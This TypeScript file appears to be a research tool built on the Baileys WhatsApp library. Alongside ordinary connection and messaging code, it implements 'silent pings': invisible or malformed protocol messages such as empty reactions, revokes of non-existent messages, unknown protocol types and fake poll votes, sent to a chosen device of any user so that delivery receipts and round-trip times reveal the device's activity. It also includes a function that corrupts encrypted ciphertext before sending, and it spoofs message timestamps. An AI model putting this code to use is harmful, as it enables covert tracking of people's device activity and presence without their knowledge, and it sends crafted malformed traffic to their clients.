import { EventEmitter } from 'events';
import path from 'path';
// Import Baileys from the parent project
import makeWASocket, {
  AnyMessageContent,
  DisconnectReason,
  fetchLatestBaileysVersion,
  generateMessageIDV2,
  generateWAMessageFromContent,
  makeCacheableSignalKeyStore,
  makeInMemoryStore,
  useMultiFileAuthState,
  WASocket,
  WAMessageKey,
  WAPresence
} from '../../../../src';
import { Boom } from '@hapi/boom';
import NodeCache from 'node-cache';
import P from 'pino';
import { ConnectionStatus, ChatInfo, ContactInfo, DeviceInfo, SilentPingResult } from '../../../shared/types/api';

interface PendingSilentPing {
  user: string;
  deviceId: number;
  timestamp: number;
  timeoutId: NodeJS.Timeout;
  type: 'reaction' | 'delete' | 'edit' | 'call-reject' | 'unknown' | 'poll-response' | 'button-response' | 'device-sent' | 'app-state' | 'peer-data-operation' | 'malformed-message';
}

export class WhatsAppService extends EventEmitter {
  private sock?: WASocket;
  private store?: any;
  private logger: any;
  private msgRetryCounterCache: NodeCache;
  private latestQRCode?: string;
  private pendingSilentPings = new Map<string, PendingSilentPing>();
  private connectionStatus: ConnectionStatus = {
    state: 'close',
    isAuthenticated: false,
    lastUpdate: new Date().toISOString(),
    baileysVersion: '6.7.21'
  };

  constructor() {
    super();
    
    // Setup logger (minimal for web server)
    this.logger = P({ 
      level: 'warn',
      timestamp: () => `,\"time\":\"${new Date().toJSON()}\"`
    });
    
    this.msgRetryCounterCache = new NodeCache();
    
    // Setup store for message/chat persistence
    this.store = makeInMemoryStore({ logger: this.logger });
    
    // Try to read existing store
    const storePath = path.join(__dirname, '../../../../../baileys_store_multi.json');
    try {
      this.store.readFromFile(storePath);
    } catch (error) {
      console.log('No existing store found, starting fresh');
    }

    // Save store periodically
    setInterval(() => {
      try {
        this.store?.writeToFile(storePath);
      } catch (error) {
        console.error('Failed to save store:', error);
      }
    }, 30_000); // Save every 30 seconds
  }

  async initialize(): Promise<void> {
    try {
      const authPath = path.resolve(__dirname, '../../../../baileys_auth_info');
      console.log(`📁 Auth path: ${authPath}`);
      
      // Check if auth directory and files exist
      const fs = require('fs');
      const credsPath = path.join(authPath, 'creds.json');
      console.log(`📄 Creds file exists: ${fs.existsSync(credsPath)}`);
      
      if (fs.existsSync(credsPath)) {
        const credsContent = fs.readFileSync(credsPath, 'utf8');
        const creds = JSON.parse(credsContent);
        console.log(`📋 Raw creds registered: ${creds.registered}`);
        console.log(`📋 Raw creds me: ${creds.me ? JSON.stringify(creds.me) : 'None'}`);
        console.log(`📋 Raw creds account: ${creds.account ? 'Present' : 'Missing'}`);
      }
      
      const { state, saveCreds } = await useMultiFileAuthState(authPath);
      const { version } = await fetchLatestBaileysVersion();

      // Check if we have existing authentication data
      const hasExistingAuth = state.creds.registered;
      const hasUserInfo = state.creds.me?.id;
      const hasSessionData = state.creds.noiseKey && state.creds.signedIdentityKey;
      const hasAccount = state.creds.account;
      const hasValidSession = hasSessionData && (hasUserInfo || hasAccount);
      
      console.log(`🔄 Initializing WhatsApp connection with version ${version.join('.')}`);
      console.log(`🔐 Authentication status:`);
      console.log(`   - Registered: ${hasExistingAuth}`);
      console.log(`   - User info: ${hasUserInfo ? `${state.creds.me?.name} (${state.creds.me?.id})` : 'None'}`);
      console.log(`   - Account: ${hasAccount ? 'Present' : 'Missing'}`);
      console.log(`   - Session data: ${hasSessionData ? 'Present' : 'Missing'}`);
      console.log(`   - Valid session: ${hasValidSession ? 'Yes' : 'No'}`);

      // Don't show QR if we have valid session (session data + user info OR account)
      // Even if not "registered", attempt connection with existing session
      const shouldShowQR = !hasValidSession;
      
      if (hasValidSession) {
        console.log('✅ Found existing valid session, attempting to connect without QR...');
        // Force registration status to true to bypass QR requirement
        if (!hasExistingAuth && hasSessionData) {
          console.log('🔧 Setting registered flag to true for existing session...');
          state.creds.registered = true;
        }
      } else {
        console.log('⚠️  No valid session found, QR authentication will be required');
      }

      this.sock = makeWASocket({
        version,
        logger: this.logger,
        printQRInTerminal: false, // Always disable terminal QR - we'll show in web UI
        auth: {
          creds: state.creds,
          keys: makeCacheableSignalKeyStore(state.keys, this.logger),
        },
        msgRetryCounterCache: this.msgRetryCounterCache,
        generateHighQualityLinkPreview: true,
        getMessage: this.getMessage.bind(this),
        qrTimeout: 60000, // 60 seconds QR timeout instead of default 20 seconds
        connectTimeoutMs: 60000 // 60 seconds connection timeout
      });

      // Bind store to socket events
      this.store?.bind(this.sock.ev);

      // Setup event handlers
      this.sock.ev.process(async (events) => {
        // Connection updates
        if (events['connection.update']) {
          const update = events['connection.update'];
          await this.handleConnectionUpdate(update);
        }

        // Save credentials when updated
        if (events['creds.update']) {
          await saveCreds();
        }

        // Handle incoming messages
        if (events['messages.upsert']) {
          this.handleMessagesUpsert(events['messages.upsert']);
        }

        // Handle message updates
        if (events['messages.update']) {
          this.handleMessagesUpdate(events['messages.update']);
        }

        // Handle chats update
        if (events['chats.update']) {
          this.emit('chats.update', events['chats.update']);
        }

        // Handle contacts update
        if (events['contacts.update']) {
          this.emit('contacts.update', events['contacts.update']);
        }
      });

    } catch (error) {
      console.error('❌ WhatsApp initialization failed:', error);
      this.updateConnectionStatus('close', false);
      throw error;
    }
  }

  private async handleConnectionUpdate(update: any): Promise<void> {
    const { connection, lastDisconnect, qr } = update;
    
    const disconnectReason = lastDisconnect?.error?.output?.statusCode;
    console.log('📱 Connection update:', { connection, disconnectReason, lastDisconnect: lastDisconnect?.error?.message });

    if (qr) {
      console.log('📱 QR Code received for authentication');
      this.latestQRCode = qr;
      this.emit('qr', qr);
    }

    if (connection === 'close') {
      const shouldReconnect = disconnectReason !== DisconnectReason.loggedOut;
      
      if (disconnectReason === DisconnectReason.connectionReplaced) {
        console.log('⚠️ Connection replaced by another instance (e.g., WhatsApp Desktop)');
        console.log('💡 Please close other WhatsApp applications or use a different session');
        this.updateConnectionStatus('close', false);
        // Don't auto-reconnect in this case to avoid conflicts
        return;
      }
      
      if (disconnectReason === DisconnectReason.multideviceMismatch) {
        console.log('⚠️ Multi-device session mismatch - clearing session');
        this.updateConnectionStatus('close', false);
        return;
      }
      
      // Handle QR timeout (408) - restart connection immediately
      if (disconnectReason === 408) {
        console.log('⏰ QR code timeout - generating new QR code...');
        this.updateConnectionStatus('connecting', false);
        setTimeout(() => this.initialize(), 2000); // Quick restart for QR regeneration
        return;
      }
      
      if (shouldReconnect) {
        console.log('🔄 Connection closed, attempting to reconnect...');
        this.updateConnectionStatus('connecting', false);
        setTimeout(() => this.initialize(), 5000);
      } else {
        console.log('❌ Connection closed: Logged out');
        this.updateConnectionStatus('close', false);
      }
    } else if (connection === 'open') {
      console.log('✅ WhatsApp connection established successfully');
      console.log(`👤 Logged in as: ${this.sock?.user?.name} (${this.sock?.user?.id})`);
      this.latestQRCode = undefined; // Clear QR code when connected
      this.updateConnectionStatus('open', true, {
        id: this.sock?.user?.id || '',
        name: this.sock?.user?.name || 'Unknown'
      });
    } else if (connection === 'connecting') {
      console.log('🔄 Connecting to WhatsApp using existing session...');
      this.updateConnectionStatus('connecting', false);
    }
  }

  private handleMessagesUpsert(upsert: any): void {
    console.log('📨 New messages:', upsert.messages.length);
    this.emit('messages.upsert', upsert);
  }

  private handleMessagesUpdate(updates: any[]): void {
    console.log('📝 Message updates:', updates.length);
    
    // Check for silent ping responses
    for (const { key, update } of updates) {
      const messageId = key?.id;
      if (messageId && this.pendingSilentPings.has(messageId) && update.status) {
        const pingInfo = this.pendingSilentPings.get(messageId)!;
        const roundTripTime = Date.now() - pingInfo.timestamp;
        
        const statusMap: { [key: number]: SilentPingResult['status'] } = {
          0: 'failed',
          1: 'sent',
          2: 'ack',
          3: 'delivered',
          4: 'read',
          5: 'read'
        };
        
        const status = statusMap[update.status] || 'ack';
        
        const result: SilentPingResult = {
          user: pingInfo.user,
          deviceId: pingInfo.deviceId,
          messageId,
          timestamp: pingInfo.timestamp,
          status,
          type: pingInfo.type,
          roundTripTime
        };
        
        console.log(`🎯 Silent ping ${status} received for ${pingInfo.user}:${pingInfo.deviceId} (${roundTripTime}ms)`);
        
        // Emit the ping result
        this.emit('ping.result', result);
        
        // Clean up tracking on final status (delivered or read)
        if (update.status >= 3) {
          clearTimeout(pingInfo.timeoutId);
          this.pendingSilentPings.delete(messageId);
        }
      }
    }
    
    this.emit('messages.update', updates);
  }

  private updateConnectionStatus(state: ConnectionStatus['state'], isAuthenticated: boolean, user?: { id: string; name: string }): void {
    this.connectionStatus = {
      state,
      isAuthenticated,
      user,
      lastUpdate: new Date().toISOString(),
      baileysVersion: '6.7.21'
    };

    this.emit('connection.status', this.connectionStatus);
  }

  // Public API methods
  getConnectionStatus(): ConnectionStatus {
    return this.connectionStatus;
  }

  getLatestQRCode(): string | undefined {
    return this.latestQRCode;
  }

  isConnected(): boolean {
    return this.connectionStatus.state === 'open' && this.connectionStatus.isAuthenticated;
  }

  getChats(): ChatInfo[] {
    if (!this.store) return [];
    
    return this.store.chats.all().slice(0, 50).map((chat: any) => ({
      id: chat.id,
      name: chat.name || 'Unknown',
      unreadCount: chat.unreadCount || 0,
      lastMessage: chat.lastMessage ? {
        text: chat.lastMessage.text || 'Media',
        timestamp: chat.lastMessage.messageTimestamp || Date.now(),
        fromMe: chat.lastMessage.key?.fromMe || false
      } : undefined
    }));
  }

  getContacts(): ContactInfo[] {
    if (!this.store) return [];
    
    return Object.values(this.store.contacts).slice(0, 3000).map((contact: any) => ({
      id: contact.id,
      name: contact.name,
      notify: contact.notify,
      isBlocked: contact.isBlocked || false
    }));
  }

  async sendMessage(jid: string, message: string, timestamp?: number): Promise<string> {
    if (!this.isConnected() || !this.sock) {
      throw new Error('WhatsApp not connected');
    }

    const messageContent: AnyMessageContent = { text: message };
    const messageOptions: any = {};

    // Add custom timestamp if provided (research mode - no validation)
    if (timestamp !== undefined) {
      messageOptions.timestamp = new Date(timestamp * 1000); // Convert Unix seconds to Date
      console.log(`📅 Sending message with custom timestamp: ${timestamp} (${new Date(timestamp * 1000).toISOString()})`);
    }

    const result = await this.sock.sendMessage(jid, messageContent, messageOptions);
    return result.key.id!;
  }

  async sendMessageToDevice(user: string, deviceId: number, message: string, timestamp?: number): Promise<string> {
    if (!this.isConnected() || !this.sock) {
      throw new Error('WhatsApp not connected');
    }

    const normalJid = `${user}@s.whatsapp.net`;
    const deviceSpecificJid = deviceId !== undefined ? `${user}:${deviceId}@s.whatsapp.net` : normalJid;

    // Generate a proper WAMessage with custom timestamp
    const messageId = generateMessageIDV2(this.sock.user?.id);

    const messageOptions: any = {
      userJid: this.sock.user?.id,
      messageId: messageId
    };

    // Add custom timestamp if provided (research mode - no validation)
    if (timestamp !== undefined) {
      messageOptions.timestamp = new Date(timestamp * 1000); // Convert Unix seconds to Date
      console.log(`📅 Sending device message with custom timestamp: ${timestamp} (${new Date(timestamp * 1000).toISOString()})`);
    }

    // Generate a proper WAMessage with the timestamp baked in
    const waMessage = generateWAMessageFromContent(
      normalJid,
      { conversation: message },
      messageOptions
    );

    const relayOptions: any = {
      messageId: messageId,
      participant: {
        jid: deviceSpecificJid,
        count: 0
      }
    };

    // Add timestamp to stanza attributes (in addition to the protobuf messageTimestamp)
    if (timestamp !== undefined) {
      relayOptions.additionalAttributes = {
        t: Math.floor(timestamp).toString() // Unix timestamp in seconds as string
      };
      console.log(`📅 Adding timestamp to stanza attributes: t=${timestamp}`);
    }

    await this.sock.relayMessage(normalJid, waMessage.message!, relayOptions);

    return messageId;
  }

  async sendReaction(user: string, messageId: string | undefined, reaction: string): Promise<string> {
    if (!this.isConnected() || !this.sock) {
      throw new Error('WhatsApp not connected');
    }

    const jid = user.includes('@') ? user : `${user}@s.whatsapp.net`;

    let targetMessageId = messageId;
    
    // If no message ID provided, react to last message
    if (!messageId && this.store) {
      const messages = this.store.messages[jid];
      if (messages && messages.array.length > 0) {
        const lastMsg = messages.array[messages.array.length - 1];
        targetMessageId = lastMsg.key.id;
      }
    }

    if (!targetMessageId) {
      throw new Error('No message to react to');
    }

    const messageKey = {
      remoteJid: jid,
      id: targetMessageId,
      fromMe: false
    };

    const result = await this.sock.sendMessage(jid, {
      react: {
        text: reaction,
        key: messageKey
      }
    });

    return result.key.id!;
  }

  async updatePresence(jid: string, presence: WAPresence): Promise<void> {
    if (!this.isConnected() || !this.sock) {
      throw new Error('WhatsApp not connected');
    }

    await this.sock.sendPresenceUpdate(presence, jid);
  }

  async readMessages(jid: string): Promise<void> {
    if (!this.isConnected() || !this.sock || !this.store) {
      throw new Error('WhatsApp not connected');
    }

    const messages = this.store.messages[jid];
    if (messages && messages.array.length > 0) {
      const lastMsg = messages.array[messages.array.length - 1];
      await this.sock.readMessages([lastMsg.key]);
    }
  }

  async getDevices(user: string): Promise<DeviceInfo[]> {
    if (!this.isConnected() || !this.sock) {
      throw new Error('WhatsApp not connected');
    }

    let jid = user.includes('@') ? user : `${user}@s.whatsapp.net`;
    
    // 🔍 TRANSLATION: If user looks like a phone number, translate to WhatsApp JID first
    // This handles cases where phone number != WhatsApp ID due to number changes
    if (!user.includes('@') && /^\+?\d+$/.test(user.replace(/[^\d+]/g, ''))) {
      console.log(`🔍 Translating phone number ${user} to WhatsApp JID...`);
      try {
        const phoneResults = await this.sock.onWhatsApp(user);
        if (phoneResults && phoneResults.length > 0 && phoneResults[0].exists) {
          jid = phoneResults[0].jid;
          console.log(`✅ Translated ${user} → ${jid}`);
        } else {
          console.log(`⚠️ Phone number ${user} not found on WhatsApp`);
          return []; // Return empty if user doesn't exist on WhatsApp
        }
      } catch (error) {
        console.log(`❌ Failed to translate phone number ${user}:`, error);
        // Fall back to original JID format if translation fails
        jid = `${user}@s.whatsapp.net`;
      }
    }

    // ✅ FIX: Use useCache=false to always fetch fresh device data from server
    // This ensures we get current device list even if cached data is stale
    const devices = await this.sock.getUSyncDevices([jid], false, false);
    
    console.log(`📱 Fetched ${devices.length} devices for ${jid} (fresh from server, not cached)`);
    
    return devices.map(device => ({
      user: device.user,
      device: device.device
    }));
  }

  async silentPing(user: string, deviceId: number, type: 'reaction' | 'delete' | 'edit' | 'call-reject' | 'unknown' | 'poll-response' | 'button-response' | 'device-sent' | 'app-state' | 'peer-data-operation' | 'malformed-message' = 'reaction'): Promise<SilentPingResult> {
    console.log(`🚀 WhatsAppService.silentPing called - User: ${user}, Device: ${deviceId}, Type: ${type}`);
    
    if (!this.isConnected() || !this.sock) {
      console.log(`❌ WhatsApp not connected - State: ${this.connectionStatus.state}, Socket: ${!!this.sock}`);
      throw new Error('WhatsApp not connected');
    }

    const jid = user.includes('@') ? user : `${user}@s.whatsapp.net`;
    const randomMessageId = generateMessageIDV2(this.sock.user?.id);
    const actualMessageId = generateMessageIDV2(this.sock.user?.id);
    const deviceSpecificJid = deviceId !== undefined ? `${user}:${deviceId}@s.whatsapp.net` : jid;

    console.log(`📡 Sending ${type}-based silent ping to device ${deviceId} of user ${user}...`);
    console.log(`📤 Tracking message ID: ${actualMessageId}`);
    console.log(`🎯 Targeting ${type} to random ID: ${randomMessageId}`);

    // Set up timeout for this ping (30 seconds)
    const timeoutId = setTimeout(() => {
      if (this.pendingSilentPings.has(actualMessageId)) {
        console.log(`⏰ ${type}-based silent ping timeout for ${user}:${deviceId} (no response after 30s)`);
        
        const result: SilentPingResult = {
          user,
          deviceId,
          messageId: actualMessageId,
          timestamp: Date.now(),
          status: 'timeout',
          type,
          error: 'No response after 30 seconds'
        };
        
        this.emit('ping.result', result);
        this.pendingSilentPings.delete(actualMessageId);
      }
    }, 30000);

    // Track this silent ping
    this.pendingSilentPings.set(actualMessageId, {
      user,
      deviceId,
      timestamp: Date.now(),
      timeoutId,
      type
    });

    let message: any;
    
    if (type === 'delete') {
      // Create a delete message targeting a non-existent message
      message = {
        protocolMessage: {
          type: 0, // REVOKE
          key: {
            remoteJid: jid,
            id: randomMessageId,
            fromMe: false
          }
        }
      };
      
      // Log delete ping message fields
      console.log(`📋 Delete Ping Message Fields:`)
      console.log(`   protocolMessage.type: ${message.protocolMessage.type} (REVOKE)`)
      console.log(`   protocolMessage.key.remoteJid: ${message.protocolMessage.key.remoteJid}`)
      console.log(`   protocolMessage.key.id: ${message.protocolMessage.key.id}`)
      console.log(`   protocolMessage.key.fromMe: ${message.protocolMessage.key.fromMe}`)
      console.log(`   Target device JID: ${deviceSpecificJid}`)
      console.log(`   Relay message ID: ${actualMessageId}`)
      
      console.log(`📋 Delete Ping Message : ${JSON.stringify(message)}`)
    } else if (type === 'edit') {
      // Create an edit message targeting a non-existent message
      message = {
        protocolMessage: {
          type: 14, // MESSAGE_EDIT
          key: {
            remoteJid: jid,
            id: randomMessageId,
            fromMe: false
          },
          editedMessage: {
            conversation: ''
          }
        }
      };
    } else if (type === 'call-reject') {
      // Create a call reject message targeting a non-existent call using protocolMessage
      // This allows us to use relayMessage for proper receipt tracking
      // WhatsApp call ID format: typically the message ID or a unique call identifier
      const whatsappCallId = randomMessageId; // Use the random message ID as call ID
      message = {
        protocolMessage: {
          type: 22, // CALL_LOG_MESSAGE type for call events
          key: {
            remoteJid: jid,
            id: randomMessageId,
            fromMe: false
          },
          callLogMessage: {
            isVideo: false,
            callOutcome: 3, // REJECTED (1=CONNECTED, 2=NO_ANSWER, 3=REJECTED, 4=FAILED)
            durationSecs: 0,
            isGroup: false,
            callId: whatsappCallId, // Use the same ID as the message key
            scheduledCallCreationMessage: null,
            participants: [{
              jid: deviceSpecificJid,
              callOutcome: 3 // REJECTED
            }]
          }
        }
      };
      
      console.log('📋 Call-reject message details:');
      console.log(`   - Call ID: ${whatsappCallId}`);
      console.log(`   - Target JID: ${jid}`);
      console.log(`   - Device-specific JID: ${deviceSpecificJid}`);
      console.log(`   - Random message ID: ${randomMessageId}`);
      console.log(`   - Actual tracking ID: ${actualMessageId}`);
      console.log(`   - Protocol type: ${message.protocolMessage.type}`);
      console.log(`   - Call outcome: ${message.protocolMessage.callLogMessage?.callOutcome} (3=REJECTED)`);
      console.log(`   - Message structure:`, JSON.stringify(message, null, 2));
    } else if (type === 'unknown') {
      // Create an unknown protocol message using non-existent type 101
      message = {
        protocolMessage: {
          type: 101, // NON-EXISTENT protocol message type
          key: {
            remoteJid: jid,
            id: randomMessageId,
            fromMe: false
          }
        }
      };
      
      console.log('📋 Unknown protocol message details:');
      console.log(`   - Protocol type: 101 (NON-EXISTENT)`);
      console.log(`   - Target JID: ${jid}`);
      console.log(`   - Device-specific JID: ${deviceSpecificJid}`);
      console.log(`   - Random message ID: ${randomMessageId}`);
      console.log(`   - Actual tracking ID: ${actualMessageId}`);
      console.log(`   - Message structure:`, JSON.stringify(message, null, 2));
    } else if (type === 'poll-response') {
      // Create a poll response message targeting a non-existent poll
      message = {
        pollUpdateMessage: {
          pollCreationMessageKey: {
            remoteJid: jid,
            id: randomMessageId,
            fromMe: false
          },
          vote: {
            selectedOptions: [0], // Vote for first option
            senderTimestampMs: Date.now()
          }
        }
      };
      
      console.log('📋 Poll response message details:');
      console.log(`   - Target poll ID: ${randomMessageId}`);
      console.log(`   - Target JID: ${jid}`);
      console.log(`   - Device-specific JID: ${deviceSpecificJid}`);
      console.log(`   - Selected option: 0`);
      console.log(`   - Actual tracking ID: ${actualMessageId}`);
      console.log(`   - Message structure:`, JSON.stringify(message, null, 2));
    } else if (type === 'button-response') {
      // Create a button response message targeting a non-existent button message
      message = {
        buttonsResponseMessage: {
          selectedButtonId: 'fake_button_id',
          contextInfo: {
            stanzaId: randomMessageId,
            participant: deviceSpecificJid
          },
          type: 1 // SINGLE_SELECT
        }
      };
      
      console.log('📋 Button response message details:');
      console.log(`   - Button ID: fake_button_id`);
      console.log(`   - Target message ID: ${randomMessageId}`);
      console.log(`   - Target JID: ${jid}`);
      console.log(`   - Device-specific JID: ${deviceSpecificJid}`);
      console.log(`   - Actual tracking ID: ${actualMessageId}`);
      console.log(`   - Message structure:`, JSON.stringify(message, null, 2));
    } else if (type === 'device-sent') {
      // Create a device sent message targeting coordination between devices
      message = {
        deviceSentMessage: {
          destinationJid: deviceSpecificJid,
          message: {
            conversation: 'fake_device_coordination_message'
          },
          phash: 'fake_participant_hash'
        }
      };
      
      console.log('📋 Device sent message details:');
      console.log(`   - Destination JID: ${deviceSpecificJid}`);
      console.log(`   - Target JID: ${jid}`);
      console.log(`   - Participant hash: fake_participant_hash`);
      console.log(`   - Actual tracking ID: ${actualMessageId}`);
      console.log(`   - Message structure:`, JSON.stringify(message, null, 2));
    } else if (type === 'app-state') {
      // Create an app state fatal exception notification with fake data
      message = {
        appStateFatalExceptionNotification: {
          collectionNames: ['fake_collection_1', 'fake_collection_2'],
          timestamp: Date.now()
        }
      };
      
      console.log('📋 App state message details:');
      console.log(`   - Collections: fake_collection_1, fake_collection_2`);
      console.log(`   - Timestamp: ${Date.now()}`);
      console.log(`   - Target JID: ${jid}`);
      console.log(`   - Device-specific JID: ${deviceSpecificJid}`);
      console.log(`   - Actual tracking ID: ${actualMessageId}`);
      console.log(`   - Message structure:`, JSON.stringify(message, null, 2));
    } else if (type === 'peer-data-operation') {
      // Create a peer data operation request message for P2P data operations
      message = {
        peerDataOperationRequestMessage: {
          peerDataOperationRequestType: 1, // Fake operation type
          peerDataOperationRequestMessageType: 1, // Fake message type  
          requestId: randomMessageId,
          // Use the deviceSpecificJid as the peer target
          applicationData: Buffer.from('fake_peer_operation_data_request_' + Date.now())
        }
      };
      
      console.log('📋 Peer data operation request message details:');
      console.log(`   - Operation type: 1 (FAKE)`);
      console.log(`   - Request ID: ${randomMessageId}`);
      console.log(`   - Target JID: ${jid}`);
      console.log(`   - Device-specific JID: ${deviceSpecificJid}`);
      console.log(`   - Application data length: ${message.peerDataOperationRequestMessage.applicationData.length} bytes`);
      console.log(`   - Actual tracking ID: ${actualMessageId}`);
      console.log(`   - Message structure:`, JSON.stringify({
        ...message,
        peerDataOperationRequestMessage: {
          ...message.peerDataOperationRequestMessage,
          applicationData: `Buffer(${message.peerDataOperationRequestMessage.applicationData.length} bytes)`
        }
      }, null, 2));
    } else if (type === 'malformed-message') {
      // Create a malformed message with invalid field name (violates proto.Message specification)
      message = {
        // ❌ INVALID FIELD: 'conversation1' is not a recognized proto.Message field
        // Valid field would be 'conversation', but 'conversation1' should trigger validation errors
        conversation1: 'fake_malformed_message_content',
        messageContextInfo: {
          deviceListMetadata: {
            senderKeyHash: Buffer.from('fake_sender_key_hash_' + Date.now()),
            senderTimestamp: Date.now()
          },
          deviceListMetadataVersion: 1
        }
      };
      
      console.log('📋 Malformed message details:');
      console.log(`   - Target JID: ${jid}`);
      console.log(`   - Device-specific JID: ${deviceSpecificJid}`);
      console.log(`   - INVALID FIELD: 'conversation1' (should be 'conversation')`);
      console.log(`   - This violates proto.Message specification - should cause PLAINTEXT_BYTE_MISMATCH`);
      console.log(`   - Actual tracking ID: ${actualMessageId}`);
      console.log(`   - Message structure:`, JSON.stringify({
        ...message,
        messageContextInfo: {
          ...message.messageContextInfo,
          deviceListMetadata: {
            ...message.messageContextInfo.deviceListMetadata,
            senderKeyHash: `Buffer(${message.messageContextInfo.deviceListMetadata.senderKeyHash.length} bytes)`
          }
        }
      }, null, 2));
    } else {
      // Default reaction-based ping
      message = {
        reactionMessage: {
          key: {
            remoteJid: jid,
            id: randomMessageId,
            fromMe: false
          },
          text: '',
          senderTimestampMs: Date.now()
        }
      };
    }

    try {
      // For all ping types, use relayMessage to generate proper receipt responses
      await this.sock.relayMessage(jid, message, {
        messageId: actualMessageId,
        participant: {
          jid: deviceSpecificJid,
          count: 0
        }
      });

      const initialResult: SilentPingResult = {
        user,
        deviceId,
        messageId: actualMessageId,
        timestamp: Date.now(),
        status: 'sent',
        type
      };

      console.log(`✅ ${type}-based silent ping sent! Waiting for response... (timeout: 30s)`);
      this.emit('ping.result', initialResult);
      
      return initialResult;
    } catch (error) {
      // Clean up tracking on error
      if (this.pendingSilentPings.has(actualMessageId)) {
        clearTimeout(this.pendingSilentPings.get(actualMessageId)!.timeoutId);
        this.pendingSilentPings.delete(actualMessageId);
      }

      const errorResult: SilentPingResult = {
        user,
        deviceId,
        messageId: actualMessageId,
        timestamp: Date.now(),
        status: 'failed',
        type,
        error: error instanceof Error ? error.message : 'Unknown error'
      };

      this.emit('ping.result', errorResult);
      throw error;
    }
  }

  async sendCorruptedMessage(user: string, deviceId: number, message: string): Promise<void> {
    if (!this.isConnected() || !this.sock) {
      throw new Error('WhatsApp not connected');
    }

    const jid = user.includes('@') ? user : `${user}@s.whatsapp.net`;
    const deviceSpecificJid = deviceId !== undefined ? `${user}:${deviceId}@s.whatsapp.net` : jid;

    // Access signal repository and hook encryption functions
    const socketAny = this.sock as any;
    const signalRepo = socketAny.signalRepository;

    if (signalRepo) {
      const originalEncryptMessage = signalRepo.encryptMessage;
      const originalEncryptGroupMessage = signalRepo.encryptGroupMessage;
      let corruptionApplied = false;

      // Hook encryption functions temporarily
      signalRepo.encryptMessage = async function(params: any) {
        const result = await originalEncryptMessage.call(this, params);
        
        if (!corruptionApplied && result.ciphertext && Buffer.isBuffer(result.ciphertext)) {
          corruptionApplied = true;
          const corrupted = Buffer.from(result.ciphertext);
          const randomIndex = Math.floor(Math.random() * corrupted.length);
          corrupted[randomIndex] = corrupted[randomIndex] ^ 0xFF;
          result.ciphertext = corrupted;
          console.log(`🔧 Corrupted message at byte ${randomIndex}`);
        }
        
        return result;
      };

      try {
        await this.sock.relayMessage(jid, { conversation: message }, {
          messageId: generateMessageIDV2(this.sock.user?.id),
          participant: {
            jid: deviceSpecificJid,
            count: 0
          }
        });
      } finally {
        // Restore original functions
        signalRepo.encryptMessage = originalEncryptMessage;
        signalRepo.encryptGroupMessage = originalEncryptGroupMessage;
      }
    } else {
      throw new Error('Signal repository not accessible');
    }
  }

  private async getMessage(key: WAMessageKey): Promise<any> {
    if (this.store) {
      const msg = await this.store.loadMessage(key.remoteJid!, key.id!);
      return msg?.message || undefined;
    }
    return undefined;
  }

  async disconnect(): Promise<void> {
    if (this.sock) {
      await this.sock.logout();
    }
  }

  async clearSession(): Promise<void> {
    console.log('🗑️ Clearing WhatsApp session...');
    
    // Only attempt logout if socket is connected
    if (this.sock && this.connectionStatus.state === 'open') {
      try {
        await this.sock.logout();
        console.log('✅ Successfully logged out from WhatsApp');
      } catch (error) {
        console.log('⚠️ Logout failed (socket already closed), proceeding with session cleanup');
      }
    }
    
    // Clear the socket reference
    this.sock = undefined;
    
    // Clear auth files for fresh start
    const fs = require('fs');
    const authPath = path.resolve(__dirname, '../../../../baileys_auth_info');
    
    try {
      if (fs.existsSync(authPath)) {
        fs.rmSync(authPath, { recursive: true, force: true });
        console.log('🗑️ Auth directory cleared');
      }
    } catch (error) {
      console.error('Failed to clear auth directory:', error);
    }
    
    // Clear the latest QR code
    this.latestQRCode = undefined;
    
    // Clear pending silent pings
    this.pendingSilentPings.clear();
    
    this.updateConnectionStatus('close', false);
    console.log('✅ Session cleared successfully');
    
    // Reinitialize connection to generate new QR code
    console.log('🔄 Reinitializing connection for fresh authentication...');
    setTimeout(() => {
      this.initialize().catch(error => {
        console.error('❌ Failed to reinitialize after session clear:', error);
      });
    }, 2000); // Small delay to ensure cleanup is complete
  }
}